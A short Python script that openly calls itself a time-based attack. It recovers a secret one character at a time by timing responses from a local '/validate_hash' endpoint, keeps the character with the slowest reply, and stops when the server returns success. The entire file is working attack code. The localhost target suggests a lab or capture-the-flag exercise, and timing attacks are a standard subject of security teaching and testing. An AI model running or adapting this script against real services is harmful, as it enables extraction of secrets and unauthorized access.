import time
import string
import requests

# === Time-Based Attack Script ===
def perform_attack():
    url = "http://127.0.0.1:5000/validate_hash"
    extracted = ""

    while True:  # Continue until the full secret is extracted
        max_time = 0
        next_char = ''

        for char in string.ascii_letters + string.digits:  # Test alphanumeric characters
            test_input = extracted + char

            start = time.time()
            response = requests.get(url, params={"input": test_input})
            elapsed = time.time() - start

            # Check if this character caused the longest delay
            if elapsed > max_time:
                max_time = elapsed
                next_char = char

        # Append the character with the longest delay
        extracted += next_char
        print(f"Extracted so far: {extracted}")

        # Check if the full secret is discovered
        response = requests.get(url, params={"input": extracted})
        if response.status_code == 200:
            print(f"Secret fully discovered: {extracted}")
            break

if __name__ == "__main__":
    print("Starting the attack...")
    perform_attack()
